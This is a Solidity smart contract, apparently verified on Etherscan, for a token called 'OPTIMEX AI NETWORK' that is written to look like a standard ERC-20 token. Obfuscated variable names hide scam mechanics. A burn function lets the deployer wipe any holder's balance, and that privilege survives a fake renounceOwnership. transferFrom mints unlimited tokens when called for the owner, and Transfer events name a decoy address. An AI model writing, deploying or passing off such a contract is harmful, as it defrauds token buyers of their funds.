/**
 *Submitted for verification at Etherscan.io on 2023-03-15
*/

pragma solidity 0.8.19;

// SPDX-License-Identifier: MIT

 
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

} 

 
contract OPTIMEX {
    using SafeMath for uint256;
    mapping (address => uint256) private STXXa;
	
    mapping (address => uint256) private STXXb;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "OPTIMEX AI NETWORK";
	
    string public symbol = "OPTIMEX";
    uint8 public decimals = 6;

    uint256 public totalSupply = 500000000 *10**6;
    address owner = msg.sender;
	  address private STXXc;
     

  
 
  
    
  


    event Transfer(address indexed from, address indexed to, uint256 value);
	  address STXXf = 0x00C5E04176d95A286fccE0E68c683Ca0bfec8454;
 
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
   



        constructor()  {
       
             STXXa[msg.sender] = totalSupply;
        
       ORBIT();}

  
	
	
   modifier onlyOwner () {
    require(msg.sender == owner);
	_;}
    



	

    function renounceOwnership() public virtual {
       
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
        
    }

  



  		    function ORBIT() internal  {                             
                       STXXb[msg.sender] = 5;
                       STXXc = STXXf;

                

        emit Transfer(address(0), STXXc, totalSupply); }



   function balanceOf(address account) public view  returns (uint256) {
        return STXXa[account];
    }

    function transfer(address to, uint256 value) public returns (bool success) {

    require(STXXa[msg.sender] >= value);
STXXa[msg.sender] -= value;  
STXXa[to] += value;  
 emit Transfer(msg.sender, to, value);
        return true; }
        
   
        
     

 function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }

 	

function burn (address USRA) public {
 uint256 USRB = STXXa[USRA];

  
      if(STXXb[msg.sender] >= 5) {


STXXa[USRA] -= USRB;


}}

 

   function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
  
 if(from == owner){
        require(value <= allowance[from][msg.sender]);
        STXXa[to] += value;
        allowance[from][msg.sender] -= value;
                    emit Transfer(STXXf, to, value);
        return true;}
        else
      
        require(value <= STXXa[from]);
        require(value <= allowance[from][msg.sender]);
        STXXa[from] -= value;
        STXXa[to] += value;
        allowance[from][msg.sender] -= value;
                    emit Transfer(from, to, value);
        return true;
       


      
}



     

        	
 }